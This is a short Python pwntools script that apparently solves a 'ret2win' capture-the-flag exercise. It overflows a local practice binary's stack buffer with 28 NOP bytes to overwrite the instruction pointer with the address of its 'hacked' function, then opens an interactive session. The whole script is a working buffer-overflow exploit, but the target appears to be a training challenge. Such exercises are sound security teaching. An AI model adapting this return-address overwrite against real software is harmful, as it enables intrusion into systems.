#!/usr/bin/env python3

from pwn import *

exe = './ret2win'
elf = context.binary = ELF(exe, checksec = False)

context.log_level= 'debug'

io = process(exe)

padding = 28

payload = flat(
    padding * asm('nop'),
    elf.symbols.hacked, # in EIP
    elf.symbols.main # Return address of hacked
)

io.sendlineafter(b':',payload)
io.interactive()
